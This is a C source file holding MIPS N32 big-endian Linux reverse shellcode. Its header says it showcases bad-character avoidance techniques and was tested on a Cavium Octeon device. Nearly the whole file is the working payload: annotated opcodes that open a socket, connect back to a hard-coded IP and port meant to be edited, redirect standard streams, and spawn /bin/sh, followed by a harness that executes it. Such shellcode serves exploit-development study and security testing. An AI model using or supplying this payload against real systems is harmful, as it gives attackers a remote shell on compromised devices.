/*
 * mips_n32_msb_linux_revsh.c - MIPS N32 MSB Linux reverse
 * Copyright (c) 2022 Marco Ivaldi <raptor@0xdeadbeef.info>
 *
 * Basic MIPS N32 MSB Linux reverse shellcode, showcasing various
 * techniques to avoid badchars.
 *
 * Cross-compile (https://buildroot.org/) with:
 * $ mips64-linux-gcc -static mips_n32_msb_linux_revsh.c -o revsh
 *
 * Tested on Linux MIPS64 Cavium Octeon III. I placed the shellcode on the
 * stack, because on my test device the .data section was not executable.
 *
 * Based on https://youtu.be/0-_Wtz5L9ZY by Evan Walls at tacnetsol.com.
 */

void main()
{
	char sc[] =

	// sub technique
	"\x24\x0d\xff\xfa"	// li $t1, -6
	"\x01\xa0\x68\x27"	// nor $t1, $zero # 5

	// sock = socket(2, 2, 0)
	"\x25\xa4\xff\xfd"	// addiu $a0, $t1, -3 # 2
	"\x25\xa5\xff\xfd"	// addiu $a1, $t1, -3 # 2
	"\x25\xa6\xff\xfb"	// addiu $a2, $t1, -5 # 0
	"\x24\x02\x17\x98"	// li $v0, 0x1798 # socket (0x1798)
	"\x01\x01\x01\x0c"	// syscall 0x40404
	"\x24\x50\x10\x10"	// addiu $s0, $v0, 0x1010 # sock + 0x1010

	// xor technique
	"\x24\x0e\x21\x21"	// li $t2, 0x2121

	// connect(sock, {2, 0x5ac2, 0x5db8d822}, 16)
	"\x26\x04\xef\xf0"	// addiu $a0, $s0, -0x1010 # sock
	"\x39\xcc\x21\x23"	// xori $t0, $t2, 0x2123 # 2
	"\xa7\xac\xff\xec"	// sh $t0, -20($sp)
	"\x24\x0c\x5a\xc2"	// li $t0, 0x5ac2 # 23234 << XXX port
	"\xa7\xac\xff\xee"	// sh $t0, -18($sp)
	"\x24\x0c\x5d\xb8"	// li $t0, 0x5db8 # 93.184 << XXX ip1
	"\xa7\xac\xff\xf0"	// sh $t0, -16($sp)
	"\x34\x0c\xd8\x22"	// li $t0, 0xd822 # 216.34 << XXX ip2
	"\xa7\xac\xff\xf2"	// sh $t0, -14($sp)
	"\x27\xa5\xff\xec"	// addiu $a1, $sp, -20
	"\x39\xc6\x21\x31"	// xori $a2, $t2, 0x2131 # 16
	"\x24\x02\x17\x99"	// li $v0, 0x1799 # connect (0x1799)
	"\x01\x01\x01\x0c"	// .byte 0x01, 0x01, 0x01, 0x0c # syscall

	// add overflow technique
	"\x24\x0f\x7f\x7f"	// li $t3, 0x7f7f

	// dup2(sock, 0)
	"\x26\x04\xef\xf0"	// addiu $a0, $s0, -0x1010 # sock
	"\x25\xe5\x80\x81"	// addiu $a1, $t3, 0x8081 # 0
	"\x24\x02\x17\x90"	// dup2 (0x1790)
	"\x01\x01\x01\x0c"	// syscall 0x40404

	// dup2(sock, 1)
	"\x26\x04\xef\xf0"	// addiu $a0, $s0, -0x1010 # sock
	"\x25\xe5\x80\x82"	// addiu $a1, $t3, 0x8082 # 1
	"\x24\x02\x17\x90"	// dup2 (0x1790)
	"\x01\x01\x01\x0c"	// syscall 0x40404

	// dup2(sock, 2)
	"\x26\x04\xef\xf0"	// addiu $a0, $s0, -0x1010 # sock
	"\x25\xe5\x80\x83"	// addiu $a1, $t3, 0x8083 # 2
	"\x24\x02\x17\x90"	// dup2 (0x1790)
	"\x01\x01\x01\x0c"	// syscall 0x40404

	// execve("/bin/sh", ["/bin/sh"], 0)
	"\x3c\x0c\x2f\x62"	// lui $t0, 0x2f62 # "/b"
	"\x25\x8c\x69\x6e"	// addiu $t0, 0x696e # "in"
	"\xaf\xac\xff\xec"	// sw $t0, -20($sp)
	"\x3c\x0c\x2f\x73"	// lui $t0, 0x2f73 # "/s"
	"\x25\x8c\x68\x68"	// addiu $t0, 0x6868 # "hh"
	"\xaf\xac\xff\xf0"	// sw $t0, -16($sp)
	"\xa3\xa0\xff\xf3"	// sb $zero, -13($sp) # NUL
	"\x27\xa4\xff\xec"	// addiu $a0, $sp, -20
	"\xaf\xa4\xff\xf8"	// sw $a0, -8($sp)
	"\xaf\xa0\xff\xfc"	// sw $zero, -4($sp)
	"\x27\xa5\xff\xf8"	// addiu $a1, $sp, -8
	"\x28\x06\xff\xff"	// slti $a2, $zero, -1 # 0 (slti technique)
	"\x24\x02\x17\xa9"	// li $v0, 0x17a9 # execve (0x17a9)
	"\x01\x01\x01\x0c";	// syscall 0x40404

	void (*f)() = (void *)sc;
	f();
}